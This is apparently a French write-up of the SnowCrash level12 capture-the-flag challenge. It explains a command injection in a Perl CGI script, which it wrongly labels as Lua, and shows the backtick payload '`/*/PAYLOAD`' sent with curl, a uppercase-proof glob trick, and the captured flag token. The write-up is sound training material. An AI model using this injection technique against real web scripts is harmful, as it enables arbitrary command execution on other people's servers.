On a un script en lua :
```lua
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}
```
Il prend 2 arguments. Il se sert du 2ème pour faire une comparaison plus tard mais ça ne nous intéresse pas.
Le premier argument en revanche est intéressant, on voit qu'il est d'abord transformé à l'aide d'une regex qui va le mettre en majuscules et supprimer les whitespace, et surtout, on voit ensuite cette ligne :
```lua
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

`egrep` sert à évaluer l'expression (comme `/e` dans le level 06) ce qui veut dire qu'on peut s'en servir pour lui faire exécuter une commande passée dans la variable `$xx` en utilisant des backtick !

On ne peut pas lui passer directement `getflag > /tmp/flag` car il serait transformé en `GETFLAG>/TMP/FLAG` et ne fonctionnerait pas car bash est case sensitive.

On va donc créer un fichier contenant la commande qu'on veut exécuter :
```bash
#!/bin/bash

getflag > /tmp/flag
```

On n'oublie pas de lui donner les droits d'exécution :
```bash
chmod +x /tmp/PAYLOAD
```

Puis on va lui passer `'/*/PAYLOAD'` qui matchera notre script :
```bash
level12@SnowCrash:~$ curl localhost:4646?x='`/*/PAYLOAD`'
..level12@SnowCrash:~$
```
Et on récupère le flag dans /tmp/flag :
```bash
..level12@SnowCrash:~cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```